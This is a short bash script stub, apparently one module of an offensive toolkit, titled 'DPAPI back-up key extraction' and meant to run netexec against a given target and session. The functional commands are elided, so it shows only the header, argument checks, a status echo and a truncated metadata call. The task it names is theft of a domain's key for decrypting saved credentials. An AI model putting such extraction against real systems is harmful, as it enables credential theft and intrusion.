#!/usr/bin/env bash
# V-061.sh — DPAPI back-up key extraction
# Category: Discovery, Web and API
# Tool: netexec
# Usage: bash V-061.sh <SESSION> <TARGET>
# Place at: ~/Desktop/trinetra/scripts/hexstrike/V-061.sh
set -euo pipefail

SESSION="${1:?ERROR: usage: bash V-061.sh <session> <target>}"
TARGET="${2:?ERROR: usage: bash V-061.sh <session> <target>}"
...
echo "[hex] V-061: DPAPI back-up key extraction → $TARGET"
...
python3 - \
    ...
    "V-061" "DPAPI back-up key extraction" "Discovery, Web and API" "netexec" \
